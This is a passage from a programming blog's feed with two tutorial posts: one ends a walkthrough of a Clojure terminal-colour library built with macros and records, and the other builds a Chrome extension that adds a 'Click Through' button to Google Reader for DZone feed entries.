<p>Disclaimer: I&rsquo;m a novice macro writer. Advanced readers, please hold your nose and tell me what I did wrong or any improvements could be made :)</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='clojure'><span class='line'><span class="p">(</span><span class="k">def </span><span class="nv">RESET</span> <span class="s">&quot;&amp;#092;&amp;#048;33[0m&quot;</span><span class="p">)</span>
</span><span class='line'><span class="p">(</span><span class="kd">defmacro </span><span class="nv">defcolour</span> <span class="p">[</span><span class="nv">colour-func-name</span> <span class="nv">bg-colour-func-name</span> <span class="nv">colour-code</span><span class="p">]</span>
</span><span class='line'>  <span class="o">`</span><span class="p">(</span><span class="nf">do</span>
</span><span class='line'>    <span class="p">(</span><span class="kd">defn </span><span class="o">~</span><span class="nv">colour-func-name</span> <span class="p">[</span><span class="nv">text#</span><span class="p">]</span>
</span><span class='line'>      <span class="p">(</span><span class="nf">format</span> <span class="s">&quot;%s%s%s&quot;</span> <span class="p">(</span><span class="nf">colour</span> <span class="o">~</span><span class="nv">colour-code</span><span class="p">)</span> <span class="nv">text#</span> <span class="nv">RESET</span><span class="p">))</span>
</span><span class='line'>    <span class="p">(</span><span class="kd">defn </span><span class="o">~</span><span class="nv">bg-colour-func-name</span> <span class="p">[</span><span class="nv">text#</span><span class="p">]</span>
</span><span class='line'>      <span class="p">(</span><span class="nf">format</span> <span class="s">&quot;%s%s%s&quot;</span> <span class="p">(</span><span class="nf">colour</span> <span class="o">~</span><span class="nv">bg-colour-code</span> <span class="nv">true</span><span class="p">)</span> <span class="nv">text#</span> <span class="nv">RESET</span><span class="p">))))</span>
</span><span class='line'>
</span><span class='line'><span class="p">(</span><span class="nf">defcolour</span> <span class="nv">black</span> <span class="nv">bg-black</span> <span class="mi">0</span><span class="p">)</span>
</span><span class='line'><span class="p">(</span><span class="nf">defcolour</span> <span class="nv">red</span> <span class="nv">bg-red</span> <span class="mi">1</span><span class="p">)</span>
</span><span class='line'><span class="p">(</span><span class="nf">defcolour</span> <span class="nv">green</span> <span class="nv">bg-green</span> <span class="mi">2</span><span class="p">)</span>
</span><span class='line'><span class="c1">; etc...</span>
</span></code></pre></td></tr></table></div></figure>


<p>A few special reader macros you need to know about when writing a macro:
* tick (`) indicates the following code should be quoted and treated as a template.
* tilda (~) indicates that the symbol should not be quoted (unquote), and should be replaced with the value in the current context.
* hash (#) indicates that the macro system should generate a unique name for this symbol so it doesn&rsquo;t conflict. Otherwise, it will be expanded to its fully qualified name.</p>

<p>Run tests and because we didn&rsquo;t change our public interface, everything all tests should still pass.</p>

<h3>Take 3: combining styles</h3>

<p>Alright, now that we have a fully functional style system, we can cascade the styles, e.g., <code>(red (bg-green "foo"))</code>. It work as expected when trying it in a REPL, but the character sequence it generates is &ldquo;33[31m33[42mfoo33[0m33[0m&rdquo; and surely it isn&rsquo;t optimal. If we want to add styles such as bold, it&rsquo;s going to get even worse.</p>

<p>So, we need some abstraction here. When you call <code>(red "some text")</code> it shouldn&rsquo;t generate the character sequence right away. Instead, the caller should decide when the sequence should be generated. We need some data structure to represent a &ldquo;luminated&rdquo; text. In Clojure we can define a &ldquo;record&rdquo;.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='clojure'><span class='line'><span class="p">(</span><span class="kd">defrecord </span><span class="nv">Lumiere</span> <span class="p">[</span><span class="nv">text</span> <span class="nv">opts</span><span class="p">])</span>
</span></code></pre></td></tr></table></div></figure>


<p><code>opts</code> is a map with keys <code>:fg</code>, <code>:bg</code>, <code>:styles</code>. We also want to override the <code>toString()</code> method so when the user calls <code>(str lumiered-text)</code>, he will get the character sequence ready to be printed to the console. The downside of this is that we modified the interface, so we need to go back and change the tests so they call <code>(str (red "foo"))</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='clojure'><span class='line'>  <span class="p">(</span><span class="nf">is</span> <span class="p">(</span><span class="nb">= </span><span class="s">&quot;&amp;#092;&amp;#048;33[30msome black text&amp;#092;&amp;#048;33[0m&quot;</span> <span class="p">(</span><span class="nb">str </span><span class="p">(</span><span class="nf">black</span> <span class="s">&quot;some black test&quot;</span><span class="p">)))))</span>
</span></code></pre></td></tr></table></div></figure>


<p>To override <code>toString()</code>, we need to extend our Lumiere type to conform to the <code>IObject</code> protocol:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='clojure'><span class='line'><span class="p">(</span><span class="kd">defn- </span><span class="nv">ansi-escape-seq</span> <span class="p">[</span><span class="o">&amp;</span> <span class="nv">codes</span><span class="p">]</span>
</span><span class='line'>  <span class="p">(</span><span class="nf">format</span> <span class="s">&quot;&amp;#092;&amp;#048;33[%sm&quot;</span> <span class="p">(</span><span class="nb">join </span><span class="s">&quot;;&quot;</span> <span class="p">(</span><span class="nb">filter </span><span class="o">#</span><span class="p">(</span><span class="nb">not= </span><span class="nv">%</span> <span class="nv">nil</span><span class="p">)</span> <span class="nv">codes</span><span class="p">))))</span>
</span><span class='line'>
</span><span class='line'><span class="p">(</span><span class="kd">defrecord </span><span class="nv">Lumiere</span> <span class="p">[</span><span class="nv">text</span> <span class="nv">fg</span> <span class="nv">bg</span> <span class="nv">styles</span><span class="p">]</span>
</span><span class='line'>  <span class="nv">Object</span>
</span><span class='line'>  <span class="p">(</span><span class="nf">toString</span> <span class="p">[</span><span class="nv">this</span><span class="p">]</span>
</span><span class='line'>    <span class="p">(</span><span class="k">let </span><span class="p">[</span><span class="nv">prefix</span> <span class="p">(</span><span class="nf">ansi-escape-seq</span> <span class="p">(</span><span class="ss">:fg</span> <span class="nv">this</span><span class="p">)</span> <span class="p">(</span><span class="ss">:bg</span> <span class="nv">this</span><span class="p">)</span> <span class="p">(</span><span class="ss">:styles</span> <span class="nv">this</span><span class="p">))]</span>
</span><span class='line'>      <span class="p">(</span><span class="nf">format</span> <span class="s">&quot;%s%s%s&quot;</span> <span class="nv">prefix</span> <span class="p">(</span><span class="ss">:text</span> <span class="nv">this</span><span class="p">)</span> <span class="nv">RESET</span><span class="p">))))</span>
</span></code></pre></td></tr></table></div></figure>


<p>Next we need to let the colour/style functions return Lumiere object, rather than plain character sequence. There are two situations we need to adapt:</p>

<ol>
<li>When we first start decorating a text, text input is going to be a plain string. In this case, we need to create a Lumiere object with the text and options.</li>
<li>When the return of a colour/style function is chained into another colour/style function, we need to modify the options of the Lumiere object.</li>
</ol>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='clojure'><span class='line'><span class="p">(</span><span class="kd">defn- </span><span class="nv">adapt-lum</span> <span class="p">[</span><span class="nv">text</span> <span class="nv">option</span> <span class="nv">value</span><span class="p">]</span>
</span><span class='line'>  <span class="p">(</span><span class="k">let </span><span class="p">[</span><span class="nv">local-option-map</span> <span class="p">(</span><span class="nb">merge </span><span class="p">{</span><span class="ss">:fg</span> <span class="nv">nil</span> <span class="ss">:bg</span> <span class="nv">nil</span> <span class="ss">:styles</span> <span class="nv">nil</span><span class="p">}</span> <span class="p">{</span><span class="nv">option</span> <span class="nv">value</span><span class="p">})]</span>
</span><span class='line'>    <span class="p">(</span><span class="nf">cond</span>
</span><span class='line'>      <span class="p">(</span><span class="nb">instance? </span><span class="nv">String</span> <span class="nv">text</span><span class="p">)</span> <span class="p">(</span><span class="nf">Lumiere.</span> <span class="nv">text</span> <span class="p">(</span><span class="ss">:fg</span> <span class="nv">local-option-map</span><span class="p">)</span> <span class="p">(</span><span class="ss">:bg</span> <span class="nv">local-option-map</span><span class="p">)</span> <span class="p">(</span><span class="ss">:styles</span> <span class="nv">local-option-map</span><span class="p">))</span>
</span><span class='line'>      <span class="p">(</span><span class="nb">instance? </span><span class="nv">Lumiere</span> <span class="nv">text</span><span class="p">)</span> <span class="p">(</span><span class="nb">assoc </span><span class="nv">text</span> <span class="nv">option</span> <span class="nv">value</span><span class="p">)</span>
</span><span class='line'>      <span class="ss">:else</span> <span class="p">(</span><span class="nf">throw</span> <span class="p">(</span><span class="nf">java.lang.IllegalArgumentException.</span><span class="p">)))))</span>
</span></code></pre></td></tr></table></div></figure>


<p>and we need to modify the macros so <code>adapt-lum</code> helper is used:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='clojure'><span class='line'><span class="p">(</span><span class="kd">defmacro </span><span class="nv">defcolour</span> <span class="p">[</span><span class="nv">colour-func-name</span> <span class="nv">bg-colour-func-name</span> <span class="o">^</span><span class="nv">Integer</span> <span class="nv">colour-code</span><span class="p">]</span>
</span><span class='line'>  <span class="o">`</span><span class="p">(</span><span class="nf">do</span>
</span><span class='line'>     <span class="p">(</span><span class="kd">defn </span><span class="o">~</span><span class="nv">colour-func-name</span> <span class="p">[</span><span class="nv">text#</span><span class="p">]</span>
</span><span class='line'>       <span class="p">(</span><span class="nf">adapt-lum</span> <span class="nv">text#</span> <span class="ss">:fg</span> <span class="o">~</span><span class="nv">colour-name</span><span class="p">))</span>
</span><span class='line'>     <span class="p">(</span><span class="kd">defn </span><span class="o">~</span><span class="nv">bg-colour-func-name</span> <span class="p">[</span><span class="nv">text#</span><span class="p">]</span>
</span><span class='line'>       <span class="p">(</span><span class="nf">adapt-lum</span> <span class="nv">text#</span> <span class="ss">:bg</span> <span class="o">~</span><span class="nv">bg-colour-name</span><span class="p">))))</span>
</span></code></pre></td></tr></table></div></figure>


<h2>Publish to Clojar.org</h2>

<p>Now that the library is in a relatively stable state. I&rsquo;d like to publish this snapshot version to a repository. Clojars.org is the most popular clojure library repository. Register on clojars.org, add let them know your public key. Then do <code>lein pom &amp;&amp; lein deploy</code>, voilà!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Building a Google Reader plugin using Chrome extension]]></title>
    <link href="http://kevinjqiu.github.io/2011/10/04/building-a-google-reader-plugin-using-chrome-extension/"/>
    <updated>2011-10-04T20:14:00-04:00</updated>
    <id>http://kevinjqiu.github.io/2011/10/04/building-a-google-reader-plugin-using-chrome-extension</id>
    <content type="html"><![CDATA[<p>OK, ok, I understand. The title is a bit misleading. <a href="http://reader.google.com">Google Reader</a> isn&rsquo;t open for 3rd party plugins, and there&rsquo;s no indication that Google will ever. However, with Google Chrome extension, we can build such local &ldquo;plugins&rdquo;.</p>

<h2>What are we going to achieve?</h2>

<p>Anyone uses Google Reader to read <a href="http://www.dzone.com">DZone</a> feeds? I do. DZone is a very good tech news aggregator and you can vote and comment on stories. With Google Reader, you get DZone feeds like the following. I don&rsquo;t know about you but for me, sometimes I just want to read the original story without going to the DZone page. It&rsquo;d be nice if they have a &ldquo;click through&rdquo; action (like the following) on the action bar that brings you to the original story.</p>

<p><a href="http://reminiscential.files.wordpress.com/2011/10/screenshot-google-reader-539-chromium.png"><img src="http://reminiscential.files.wordpress.com/2011/10/screenshot-google-reader-539-chromium.png?w=300" alt="End goal" title="Screenshot-Google Reader (539) - Chromium" width="300" height="100" class="aligncenter size-medium wp-image-262" /></a></p>

<h2>Basic strategy</h2>

<p>So, how are we going to implement this feature? Chrome Extension code can be injected into the running page, and have full access to its DOM. Therefore, we can write code such that if the currently opened entry is a DZone entry, we insert &lsquo;Click Through&rsquo; action into the entry action bar (action bar is the bar underneath the main entry, where &lsquo;Add Star&rsquo;, &lsquo;Like&rsquo;, &lsquo;Share&rsquo; actions are). The &lsquo;Click Through&rsquo; action, when clicked, will read the feed URL, fetch it in the background, parse it and get the URL of the original story, and open the original URL in a separate tab.</p>

<p><a href="http://reminiscential.files.wordpress.com/2011/10/untitled-1.png"><img class="aligncenter size-medium wp-image-261" title="strategy" src="http://reminiscential.files.wordpress.com/2011/10/untitled-1.png?w=300" alt="" width="300" height="231" /></a></p>

<h3>Create a manifest</h3>

<p>A Chrome extension must have a manifest.json file containing the metadata of the extension.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="s2">&quot;name&quot;</span><span class="o">:</span><span class="s2">&quot;GReader&quot;</span><span class="p">,</span>
</span><span class='line'>    <span class="s2">&quot;version&quot;</span><span class="o">:</span><span class="s2">&quot;1.0&quot;</span><span class="p">,</span>
</span><span class='line'>    <span class="s2">&quot;description&quot;</span><span class="o">:</span><span class="s2">&quot;Enhanced Google Reader experience&quot;</span><span class="p">,</span>
</span><span class='line'>    <span class="s2">&quot;permissions&quot;</span><span class="o">:</span> <span class="p">[</span>
</span><span class='line'>        <span class="s2">&quot;http://*.dzone.com/&quot;</span>
</span><span class='line'>    <span class="p">],</span>
</span><span class='line'>    <span class="s2">&quot;background_page&quot;</span><span class="o">:</span><span class="s2">&quot;background.html&quot;</span><span class="p">,</span>
</span><span class='line'>    <span class="s2">&quot;content_scripts&quot;</span><span class="o">:</span><span class="p">[{</span>
</span><span class='line'>        <span class="s2">&quot;matches&quot;</span><span class="o">:</span><span class="p">[</span>
</span><span class='line'>            <span class="s2">&quot;*://www.google.com/reader/view/*&quot;</span>
</span><span class='line'>        <span class="p">],</span>
</span><span class='line'>        <span class="s2">&quot;js&quot;</span><span class="o">:</span><span class="p">[</span>
</span><span class='line'>            <span class="s2">&quot;lib/jquery-1.6.4.min.js&quot;</span><span class="p">,</span>
</span><span class='line'>            <span class="s2">&quot;src/greader.js&quot;</span>
</span><span class='line'>        <span class="p">],</span>
</span><span class='line'>        <span class="s2">&quot;run_at&quot;</span><span class="o">:</span><span class="s2">&quot;document_idle&quot;</span>
</span><span class='line'>    <span class="p">}]</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Here we</p>

<ul>
<li>specify that the extension needs to access any URL on dzone.com including its subdomains.</li>
<li>specify the background page</li>
<li>specify the content script</li>
</ul>


<p>The &ldquo;run_at&rdquo; property will dictate when the content script is going to be run. Because Google Reader is a full AJAX application, we want our script to be run when the document is fully rendered.</p>

<p>We also specify the &ldquo;matches&rdquo; property, so our content script is only activated when the URL matches.</p>

<h3>The content script</h3>

<p>We start with:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">$</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>
</span><span class='line'><span class="p">})(</span><span class="nx">jQuery</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>This creates a function scope, which separates our <code>$</code> variable apart from the current page&rsquo;s <code>$</code> variable. Google Reader (I assume, is using Google&rsquo;s own closure library), already defines $ and it&rsquo;s not the jQuery object. This idiom gives <code>$</code> as jQuery.</p>

<p>We want to insert the &ldquo;Click through&rdquo; action in the entry action bar. To achieve this, we will need to listen on <code>DOMNodeInserted</code> event, and when such event happens and the node inserted is of the right CSS class name (&ldquo;entry-action&rdquo; here), we proceed to manipulate the DOM to add our customized actions.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="nx">$</span><span class="p">(</span><span class="s2">&quot;#entries&quot;</span><span class="p">).</span><span class="nx">live</span><span class="p">(</span><span class="s1">&#39;DOMNodeInserted&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">e</span><span class="p">.</span><span class="nx">target</span><span class="p">.</span><span class="nx">className</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/entry\-actions/</span><span class="p">))</span>
</span><span class='line'>        <span class="k">return</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="kd">var</span> <span class="nx">entryAction</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">EntryAction</span><span class="p">(</span><span class="nx">$</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">target</span><span class="p">));</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="nx">entryAction</span><span class="p">.</span><span class="nx">entry</span><span class="p">.</span><span class="nx">url</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/^http\:\/\/feeds\.dzone\.com/</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>        <span class="nx">entryAction</span><span class="p">.</span><span class="nx">addAction</span><span class="p">({</span>
</span><span class='line'>            <span class="s1">&#39;name&#39;</span><span class="o">:</span><span class="s1">&#39;Click Through&#39;</span><span class="p">,</span>
</span><span class='line'>            <span class="s1">&#39;fn&#39;</span><span class="o">:</span><span class="kd">function</span><span class="p">(</span><span class="nx">entry</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>                <span class="nx">chrome</span><span class="p">.</span><span class="nx">extension</span><span class="p">.</span><span class="nx">sendRequest</span><span class="p">({</span><span class="s2">&quot;type&quot;</span><span class="o">:</span><span class="s2">&quot;fetch_entry&quot;</span><span class="p">,</span> <span class="s2">&quot;url&quot;</span><span class="o">:</span><span class="nx">entry</span><span class="p">.</span><span class="nx">url</span><span class="p">},</span> <span class="kd">function</span><span class="p">(</span><span class="nx">response</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>                    <span class="kd">var</span> <span class="nx">matched</span> <span class="o">=</span> <span class="sr">/&lt;div class=&quot;ldTitle&quot;&gt;(.*?)&lt;\/div&gt;/</span><span class="p">.</span><span class="nx">exec</span><span class="p">(</span><span class="nx">response</span><span class="p">.</span><span class="nx">data</span><span class="p">);</span>
</span><span class='line'>                    <span class="kd">var</span> <span class="nx">href</span> <span class="o">=</span> <span class="p">(</span><span class="nx">$</span><span class="p">(</span><span class="nx">matched</span><span class="p">[</span><span class="mi">1</span><span class="p">]).</span><span class="nx">attr</span><span class="p">(</span><span class="s2">&quot;href&quot;</span><span class="p">));</span>
</span><span class='line'>                    <span class="k">if</span> <span class="p">(</span><span class="nx">href</span> <span class="o">!==</span> <span class="kc">null</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>                        <span class="nx">chrome</span><span class="p">.</span><span class="nx">extension</span><span class="p">.</span><span class="nx">sendRequest</span><span class="p">({</span><span class="s2">&quot;type&quot;</span><span class="o">:</span><span class="s2">&quot;open_tab&quot;</span><span class="p">,</span> <span class="s2">&quot;url&quot;</span><span class="o">:</span><span class="nx">href</span><span class="p">},</span> <span class="kd">function</span><span class="p">(</span><span class="nx">response</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>                            <span class="c1">// TODO: do something afterwards?</span>
</span><span class='line'>                        <span class="p">});</span>
</span><span class='line'>                    <span class="p">}</span>
</span><span class='line'>                <span class="p">});</span>
</span><span class='line'>            <span class="p">}</span>
</span><span class='line'>        <span class="p">});</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">});</span>
</span></code></pre></td></tr></table></div></figure>


<p>Here I built a little bit of abstraction around the raw entry action bar. It&rsquo;s encapsulated in EntryAction class, which I&rsquo;ll show in a moment. Basically, if the current displaying entry&rsquo;s feed URL starts with feed.dzone.com, I&rsquo;ll build the &ldquo;click through&rdquo; action, and set the click handler. It sends the feed URL to the background script. The background script will do the cross-site request to fetch the feed content and send it back. Then the content script will regex match the content to get the original story&rsquo;s URL, and ask chrome to open the URL in a new tab.</p>

<p>Here&rsquo;s the code for <code>EntryAction</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="kd">var</span> <span class="nx">EntryAction</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">element</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">this</span><span class="p">.</span><span class="nx">element</span> <span class="o">=</span> <span class="nx">element</span><span class="p">;</span>
</span><span class='line'>    <span class="kd">var</span> <span class="nx">entryElmt</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">element</span><span class="p">.</span><span class="nx">parent</span><span class="p">(</span><span class="s2">&quot;.entry&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="kd">var</span> <span class="nx">url</span> <span class="o">=</span> <span class="nx">$</span><span class="p">(</span><span class="nx">entryElmt</span><span class="p">).</span><span class="nx">find</span><span class="p">(</span><span class="s2">&quot;.entry-title-link&quot;</span><span class="p">).</span><span class="nx">attr</span><span class="p">(</span><span class="s1">&#39;href&#39;</span><span class="p">);</span>
</span><span class='line'>    <span class="k">this</span><span class="p">.</span><span class="nx">entry</span> <span class="o">=</span> <span class="p">{</span>
</span><span class='line'>        <span class="s2">&quot;url&quot;</span> <span class="o">:</span> <span class="nx">url</span>
</span><span class='line'>    <span class="p">};</span>
</span><span class='line'><span class="p">};</span>
</span><span class='line'>
</span><span class='line'><span class="nx">EntryAction</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">addAction</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">action</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="kd">var</span> <span class="nx">that</span> <span class="o">=</span> <span class="k">this</span><span class="p">;</span>
</span><span class='line'>    <span class="kd">var</span> <span class="nx">onclick</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="kd">var</span> <span class="nx">actionFunc</span> <span class="o">=</span> <span class="nx">action</span><span class="p">[</span><span class="s1">&#39;fn&#39;</span><span class="p">];</span>
</span><span class='line'>        <span class="nx">actionFunc</span><span class="p">(</span><span class="nx">that</span><span class="p">.</span><span class="nx">entry</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">this</span><span class="p">.</span><span class="nx">element</span><span class="p">.</span><span class="nx">append</span><span class="p">(</span><span class="nx">$</span><span class="p">(</span><span class="s2">&quot;&lt;span&gt;&quot;</span><span class="p">)</span>
</span><span class='line'>        <span class="p">.</span><span class="nx">addClass</span><span class="p">(</span><span class="s2">&quot;link unselectable&quot;</span><span class="p">)</span>
</span><span class='line'>        <span class="p">.</span><span class="nx">text</span><span class="p">(</span><span class="nx">action</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span>
</span><span class='line'>        <span class="p">.</span><span class="nx">click</span><span class="p">(</span><span class="nx">onclick</span><span class="p">));</span>
</span><span class='line'><span class="p">};</span>
</span></code></pre></td></tr></table></div></figure>


<p>I won&rsquo;t delve too much into this code. It makes assumptions about the structure of the DOM that Google Reader renders into. This does make the extension brittle but that&rsquo;s the reality we have to deal with for client-side scripting. Luckily, Google Reader markup doesn&rsquo;t change very often. For people new to object-oriented Javascript, this is one way to create a &ldquo;class&rdquo; (prototype) and put &ldquo;instance&rdquo; methods on a &ldquo;class&rdquo;.</p>

<h3>Background.html</h3>

<p>Unlike content scripts, which is injected and runs in the target page, the background page runs in its own process (the extension&rsquo;s process) and keeps running while the extension is active. It&rsquo;s comparable to the &ldquo;server&rdquo; side of the extension. For our extension&rsquo;s purpose, we&rsquo;re using the background script to make requests to 3rd party web sites (DZone).</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;html&gt;</span>
</span><span class='line'><span class="nt">&lt;script </span><span class="na">type=</span><span class="s">&quot;text/javascript&quot;</span> <span class="na">src=</span><span class="s">&quot;lib/jquery-1.6.4.min.js&quot;</span><span class="nt">&gt;&lt;/script&gt;</span>
</span><span class='line'><span class="nt">&lt;script&gt;</span>
</span><span class='line'>    <span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">$</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="nx">chrome</span><span class="p">.</span><span class="nx">extension</span><span class="p">.</span><span class="nx">onRequest</span><span class="p">.</span><span class="nx">addListener</span><span class="p">(</span>
</span><span class='line'>            <span class="kd">function</span><span class="p">(</span><span class="nx">request</span><span class="p">,</span> <span class="nx">sender</span><span class="p">,</span> <span class="nx">sendResponse</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>                <span class="k">if</span> <span class="p">(</span><span class="nx">request</span><span class="p">.</span><span class="nx">type</span> <span class="o">===</span> <span class="s1">&#39;fetch_entry&#39;</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>                    <span class="nx">$</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="nx">request</span><span class="p">.</span><span class="nx">url</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>                        <span class="nx">sendResponse</span><span class="p">({</span><span class="s2">&quot;data&quot;</span><span class="o">:</span><span class="nx">data</span><span class="p">});</span>
</span><span class='line'>                    <span class="p">});</span>
</span><span class='line'>                <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">request</span><span class="p">.</span><span class="nx">type</span> <span class="o">===</span> <span class="s1">&#39;open_tab&#39;</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>                    <span class="nx">chrome</span><span class="p">.</span><span class="nx">tabs</span><span class="p">.</span><span class="nx">create</span><span class="p">({</span><span class="s1">&#39;url&#39;</span><span class="o">:</span><span class="nx">request</span><span class="p">.</span><span class="nx">url</span><span class="p">});</span>
</span><span class='line'>                    <span class="nx">sendResponse</span><span class="p">({</span><span class="s2">&quot;status&quot;</span><span class="o">:</span><span class="s2">&quot;ok&quot;</span><span class="p">});</span>
</span><span class='line'>                <span class="p">}</span>
</span><span class='line'>            <span class="p">}</span>
</span><span class='line'>        <span class="p">);</span>
</span><span class='line'>    <span class="p">})(</span><span class="nx">jQuery</span><span class="p">);</span>
</span><span class='line'><span class="nt">&lt;/script&gt;</span>
</span><span class='line'><span class="nt">&lt;/html&gt;</span>
</span></code></pre></td></tr></table></div></figure>


